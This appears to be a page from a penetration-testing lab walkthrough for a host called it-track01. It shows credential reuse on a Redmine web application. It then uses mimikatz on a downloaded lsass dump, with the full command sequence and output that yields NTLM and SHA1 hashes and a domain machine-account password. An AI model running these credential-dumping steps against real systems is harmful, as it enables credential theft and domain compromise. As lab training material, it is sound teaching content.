---
layout: default
---

## it-track01 (Security) 192.168.4.111

The main idea for the it-track01 machine related to security domain compromised it's hunt for users and hashes that allow access to gcbsec domain.

### 1. Access to it-track01 web apllication at port 80

```
http://192.168.4.111/redmine/
```

And reuse credentials for user extracted on employee15$ machine:

```
                Type            : {3ccd5499-87a8-4b10-a215-608888dd3b55}
                LastWritten     : 4/29/2024 4:11:34 AM
                Flags           : 00000400
                Ressource       : [STRING] http://192.168.4.111/
                Identity        : [STRING] itemployees
                Authenticator   :
                PackageSid      :
                *Authenticator* : [STRING] ReadOnlyAccess
```


### 2. Detect the issue in bitnami application under investigation

![ Redmine investigation issue ](/assets/images/bitnami_lsass.png)

Download the attachments and extract the lsass dmp credentials in attacker local machine:

```
PS C:\tools> .\mimikatz_2_1_1.exe

  .#####.   mimikatz 2.1.1 (x64) #17763 Dec  9 2018 23:56:50
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonPasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 192689 (00000000:0002f0b1)
Session           : RemoteInteractive from 2
User Name         : admin
Domain            : SEC-SYSLOG01
Logon Server      : SEC-SYSLOG01
Logon Time        : 6/19/2019 11:14:26 AM
SID               : S-1-5-21-2886985321-2087241558-4159712032-1001
        msv :
         [00000003] Primary
         * Username : admin
         * Domain   : SEC-SYSLOG01
         * NTLM     : fd9987e39827094aebac8233fefa519b
         * SHA1     : 7182491bf6a50aa4ad13aa441ec49ff50c35b706
        tspkg :
        wdigest :
         * Username : admin
         * Domain   : SEC-SYSLOG01
         * Password : (null)
        kerberos :
         * Username : admin
         * Domain   : SEC-SYSLOG01
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 84305 (00000000:00014951)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/19/2019 11:11:23 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : SEC-SYSLOG01$
         * Domain   : SEC
         * NTLM     : 5bd738f3f97afeb8279539c750818c3d
         * SHA1     : 0c4648641d44317c0326ff59a36cf5fd1f4bc9ad
        tspkg :
        wdigest :
         * Username : SEC-SYSLOG01$
         * Domain   : SEC
         * Password : (null)
        kerberos :
         * Username : SEC-SYSLOG01$
         * Domain   : gcbsec.local
         * Password : Lev'Yg?43_#u4D@ctBvQoTB4HF;X^nfK:_,Nl&4hX[g-WYYkOVbt?-dbm2_u`y!g<Ur-q3M8 t UxEZnHa9mr-brXPw9P@4?Q_ys&(hENE-t,d<oDHjtF&$:
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SEC-SYSLOG01$
Domain            : SEC
Logon Server      : (null)
Logon Time        : 6/19/2019 11:11:18 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : SEC-SYSLOG01$
         * Domain   : SEC
         * NTLM     : 5bd738f3f97afeb8279539c750818c3d
         * SHA1     : 0c4648641d44317c0326ff59a36cf5fd1f4bc9ad
        tspkg :
        wdigest :
         * Username : SEC-SYSLOG01$
         * Domain   : SEC
         * Password : (null)
        kerberos :
         * Username : sec-syslog01$
         * Domain   : GCBSEC.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 18266 (00000000:0000475a)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/19/2019 11:11:18 AM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : SEC-SYSLOG01$
         * Domain   : SEC
         * NTLM     : 5bd738f3f97afeb8279539c750818c3d
         * SHA1     : 0c4648641d44317c0326ff59a36cf5fd1f4bc9ad
        tspkg :
        wdigest :
         * Username : SEC-SYSLOG01$
         * Domain   : SEC
         * Password : (null)
        kerberos :
         * Username : SEC-SYSLOG01$
         * Domain   : gcbsec.local
         * Password : Lev'Yg?43_#u4D@ctBvQoTB4HF;X^nfK:_,Nl&4hX[g-WYYkOVbt?-dbm2_u`y!g<Ur-q3M8 t UxEZnHa9mr-brXPw9P@4?Q_ys&(hENE-t,d<oDHjtF&$:
        ssp :
        credman :

Authentication Id : 0 ; 17298 (00000000:00004392)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 6/19/2019 11:11:17 AM
SID               :
        msv :
         [00000003] Primary
         * Username : SEC-SYSLOG01$
         * Domain   : SEC
         * NTLM     : 5bd738f3f97afeb8279539c750818c3d
         * SHA1     : 0c4648641d44317c0326ff59a36cf5fd1f4bc9ad
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 6/19/2019 11:11:18 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 18361 (00000000:000047b9)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/19/2019 11:11:18 AM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : SEC-SYSLOG01$
         * Domain   : SEC
         * NTLM     : 5bd738f3f97afeb8279539c750818c3d
         * SHA1     : 0c4648641d44317c0326ff59a36cf5fd1f4bc9ad
        tspkg :
        wdigest :
         * Username : SEC-SYSLOG01$
         * Domain   : SEC
         * Password : (null)
        kerberos :
         * Username : SEC-SYSLOG01$
         * Domain   : gcbsec.local
         * Password : Lev'Yg?43_#u4D@ctBvQoTB4HF;X^nfK:_,Nl&4hX[g-WYYkOVbt?-dbm2_u`y!g<Ur-q3M8 t UxEZnHa9mr-brXPw9P@4?Q_ys&(hENE-t,d<oDHjtF&$:
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SEC-SYSLOG01$
Domain            : SEC
Logon Server      : (null)
Logon Time        : 6/19/2019 11:11:17 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : SEC-SYSLOG01$
         * Domain   : SEC
         * Password : (null)
        kerberos :
         * Username : sec-syslog01$
         * Domain   : GCBSEC.LOCAL
         * Password : (null)
        ssp :
        credman :

```


[back](./section5.html)
